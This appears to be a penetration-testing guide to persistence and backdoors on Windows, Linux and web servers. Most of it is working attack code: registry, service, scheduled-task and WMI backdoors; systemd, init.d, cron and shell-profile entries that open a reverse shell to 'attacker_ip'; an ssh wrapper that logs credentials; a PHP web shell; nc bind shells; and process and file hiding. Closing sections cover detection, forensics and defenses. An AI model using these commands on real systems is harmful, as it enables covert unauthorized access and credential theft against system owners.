# Persistence and Backdoors

Advanced techniques for maintaining long-term access to compromised systems during authorized penetration testing.

## Overview

Persistence mechanisms allow maintaining access to compromised systems across reboots, user sessions, and security updates. Understanding these techniques is crucial for comprehensive penetration testing and for defenders to identify and prevent unauthorized persistence.

## Persistence Categories

### System-Level Persistence

| Method | Platform | Stealth Level | Persistence Level |
|--------|----------|---------------|------------------|
| **Service creation** | Windows/Linux | Medium | High |
| **Scheduled tasks** | Windows/Linux | Medium | High |
| **Registry modifications** | Windows | High | Medium |
| **Startup scripts** | Linux | Low | High |

### User-Level Persistence

| Method | Platform | Detection Difficulty | Maintenance |
|--------|----------|---------------------|-------------|
| **SSH keys** | Linux/macOS | Low | Easy |
| **Shell profiles** | Unix-like | Medium | Easy |
| **Browser extensions** | Cross-platform | High | Medium |
| **Application plugins** | Cross-platform | High | Hard |

## Windows Persistence Techniques

### Registry-Based Persistence

#### Run Keys
```powershell
# Current user run key
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "UpdaterService" /t REG_SZ /d "C:\Windows\System32\backdoor.exe"

# Local machine run key (requires admin)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemUpdater" /t REG_SZ /d "C:\Windows\System32\backdoor.exe"

# Run once keys
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "InitialSetup" /t REG_SZ /d "powershell.exe -WindowStyle Hidden -File C:\temp\init.ps1"
```

#### Service Installation
```powershell
# Create service
sc create "WindowsUpdateHelper" binPath= "C:\Windows\System32\backdoor.exe" start= auto

# Alternative using PowerShell
New-Service -Name "SystemMonitor" -BinaryPathName "C:\Windows\System32\backdoor.exe" -StartupType Automatic -Description "System monitoring service"

# Enable service
sc config "WindowsUpdateHelper" start= auto
sc start "WindowsUpdateHelper"
```

### Scheduled Tasks
```powershell
# Create scheduled task
schtasks /create /tn "SystemCleanup" /tr "powershell.exe -WindowStyle Hidden -File C:\temp\cleanup.ps1" /sc onlogon /ru SYSTEM

# Advanced task with XML
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -File C:\temp\monitor.ps1"
$trigger = New-ScheduledTaskTrigger -AtLogOn
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
Register-ScheduledTask -TaskName "UserProfileSync" -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest
```

### WMI Event Subscription
```powershell
# Create WMI event filter
$FilterArgs = @{name='SystemStartup'; EventNameSpace='root\CimV2'; QueryLanguage="WQL"; Query="SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2"}
$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Arguments $FilterArgs

# Create WMI event consumer  
$ConsumerArgs = @{name='SystemStartupConsumer'; CommandLineTemplate="powershell.exe -WindowStyle Hidden -File C:\temp\startup.ps1"}
$Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Arguments $ConsumerArgs

# Bind filter to consumer
$FilterToConsumerArgs = @{Filter = [Ref] $Filter; Consumer = [Ref] $Consumer}
$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Arguments $FilterToConsumerArgs
```

## Linux Persistence Techniques

### Service-Based Persistence

#### Systemd Services
```bash
# Create service file
cat > /etc/systemd/system/system-monitor.service << EOF
[Unit]
Description=System Monitor Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1'
Restart=always
RestartSec=5
User=root

[Install]
WantedBy=multi-user.target
EOF

# Enable and start service
systemctl enable system-monitor.service
systemctl start system-monitor.service
```

#### Init.d Scripts (Legacy)
```bash
# Create init script
cat > /etc/init.d/netmon << 'EOF'
#!/bin/bash
### BEGIN INIT INFO
# Provides:          netmon
# Required-Start:    $network
# Required-Stop:     $network
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Description:       Network monitoring service
### END INIT INFO

case "$1" in
    start)
        /bin/bash -c 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1' &
        ;;
    stop)
        pkill -f "attacker_ip"
        ;;
    *)
        echo "Usage: $0 {start|stop}"
        exit 1
        ;;
esac
EOF

chmod +x /etc/init.d/netmon
update-rc.d netmon defaults
```

### Cron-Based Persistence
```bash
# User crontab
(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1'") | crontab -

# System-wide cron
echo "*/10 * * * * root /bin/bash -c 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1'" >> /etc/crontab

# Anacron for systems not always on
echo "1 5 system-check /bin/bash -c 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1'" >> /etc/anacrontab
```

### SSH Key Persistence
```bash
# Add SSH key to authorized_keys
mkdir -p ~/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
chmod 700 ~/.ssh

# Hide in less obvious locations
mkdir -p ~/.config/systemd
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ..." >> ~/.config/systemd/authorized_keys
```

### Profile-Based Persistence
```bash
# Bash profile modification
echo 'export PATH="/tmp/.hidden:$PATH"' >> ~/.bashrc
echo '/bin/bash -c "bash -i >& /dev/tcp/attacker_ip/4444 0>&1" &' >> ~/.bash_profile

# System-wide profile
echo 'if [ "$USER" = "target_user" ]; then /tmp/backdoor & fi' >> /etc/profile
```

## Advanced Persistence Techniques

### DLL Hijacking (Windows)
```powershell
# Identify DLL search order
$env:PATH -split ';'

# Place malicious DLL in higher priority location
Copy-Item "malicious.dll" "C:\Windows\System32\legitimate_name.dll"

# PowerShell DLL hijacking
$code = @"
using System;
using System.Runtime.InteropServices;
public class Backdoor {
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();
    
    public static void Execute() {
        // Backdoor code here
    }
}
"@
Add-Type -TypeDefinition $code
```

### Binary Replacement
```bash
# Replace legitimate binary with trojan
cp /bin/ps /tmp/ps_backup
cp backdoor_ps /bin/ps

# Wrapper script technique
mv /usr/bin/ssh /usr/bin/ssh_real
cat > /usr/bin/ssh << 'EOF'
#!/bin/bash
# Log credentials
echo "$@" >> /tmp/.ssh_log
# Execute real ssh
/usr/bin/ssh_real "$@"
EOF
chmod +x /usr/bin/ssh
```

### Kernel Module Persistence (Linux)
```bash
# Simple kernel module (requires root)
cat > backdoor.c << 'EOF'
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

static int __init backdoor_init(void) {
    printk(KERN_INFO "Backdoor: Module loaded\n");
    // Backdoor functionality here
    return 0;
}

static void __exit backdoor_exit(void) {
    printk(KERN_INFO "Backdoor: Module unloaded\n");
}

module_init(backdoor_init);
module_exit(backdoor_exit);
MODULE_LICENSE("GPL");
EOF

# Compile and install
make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
insmod backdoor.ko
echo "backdoor" >> /etc/modules
```

## Web-Based Persistence

### Web Shell Deployment
```php
<?php
// Simple PHP web shell
if(isset($_REQUEST['cmd'])){
    $cmd = $_REQUEST['cmd'];
    system($cmd);
}

// Advanced web shell with authentication
if(isset($_POST['pass']) && $_POST['pass'] == 'secret_password'){
    if(isset($_POST['cmd'])){
        echo "<pre>" . shell_exec($_POST['cmd']) . "</pre>";
    }
}
?>
```

### Database Triggers
```sql
-- MySQL trigger for persistence
DELIMITER //
CREATE TRIGGER backdoor_trigger
AFTER INSERT ON user_table
FOR EACH ROW
BEGIN
    IF NEW.username = 'admin' THEN
        SELECT load_file('/tmp/backdoor.sh') INTO @shell;
        -- Execute system commands
    END IF;
END//
DELIMITER ;
```

## Evasion and Stealth

### Process Hiding
```bash
# Process name spoofing
exec -a '[kworker/0:1]' /path/to/backdoor

# Hide from ps
mount -o bind /tmp/fake_proc /proc/PID

# Use legitimate process names
cp backdoor /usr/sbin/networkd
```

### File Hiding
```bash
# Hidden files and directories
mkdir /tmp/...
mkdir /dev/.hidden
touch /var/log/.system

# Attribute manipulation
chattr +i /path/to/backdoor  # Immutable
chattr +a /path/to/logfile   # Append only
```

### Network Stealth
```bash
# Use common ports
nc -l -p 80 -e /bin/bash     # HTTP
nc -l -p 443 -e /bin/bash    # HTTPS
nc -l -p 53 -e /bin/bash     # DNS

# Protocol tunneling
ssh -D 8080 -N -f user@attacker_server
```

## Detection and Forensics

### Persistence Detection

#### Windows Detection
```powershell
# Check registry run keys
Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"

# List services
Get-Service | Where-Object {$_.Status -eq "Running"}
Get-WmiObject -Class Win32_Service | Select Name, PathName, StartMode

# Check scheduled tasks
Get-ScheduledTask | Where-Object {$_.State -eq "Ready"}
schtasks /query /fo LIST /v
```

#### Linux Detection
```bash
# Check systemd services
systemctl list-units --type=service --state=running
systemctl list-unit-files --type=service --state=enabled

# Check cron jobs
crontab -l
cat /etc/crontab
ls -la /etc/cron.*
find /var/spool/cron -type f

# Check startup scripts
ls -la /etc/init.d/
ls -la /etc/systemd/system/
```

### Forensic Artifacts

| Artifact Type | Windows Location | Linux Location |
|---------------|------------------|----------------|
| **Registry** | HKLM/HKCU Software | N/A |
| **Services** | Services.msc | /etc/systemd/system/ |
| **Scheduled Tasks** | Task Scheduler | /var/spool/cron/ |
| **Startup Items** | Startup folders | /etc/init.d/ |
| **Log Files** | Event Viewer | /var/log/ |

## Security Considerations

### Legal and Ethical Guidelines
- Only implement persistence on authorized test systems
- Remove all persistence mechanisms after testing
- Document all persistence methods for client remediation
- Ensure persistence doesn't survive beyond test period
- Follow engagement rules regarding system modifications

### Operational Security
| Practice | Purpose | Implementation |
|----------|---------|---------------|
| **Backup original files** | System restoration | Copy before modification |
| **Use non-destructive methods** | Avoid system damage | Reversible changes |
| **Monitor system impact** | Performance assessment | Resource monitoring |
| **Maintain access logs** | Audit trail | Detailed documentation |

## Defensive Measures

### Prevention Strategies
| Control | Purpose | Implementation |
|---------|---------|---------------|
| **Application whitelisting** | Prevent unauthorized execution | AppLocker, SRP |
| **Service monitoring** | Detect unauthorized services | Service auditing |
| **Registry monitoring** | Detect unauthorized changes | Registry auditing |
| **File integrity monitoring** | Detect file modifications | HIDS solutions |

### Detection Systems
| Method | Coverage | Tools |
|--------|----------|-------|
| **Behavioral analysis** | Process monitoring | EDR solutions |
| **Signature detection** | Known patterns | Antivirus |
| **Heuristic analysis** | Suspicious behavior | HIPS |
| **Network monitoring** | Communication patterns | IDS/IPS |

## Additional Resources

- [MITRE ATT&CK Persistence Techniques](https://attack.mitre.org/tactics/TA0003/)
- [Windows Sysinternals](https://docs.microsoft.com/en-us/sysinternals/)
- [Linux Persistence Techniques](https://attack.mitre.org/techniques/T1543/)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)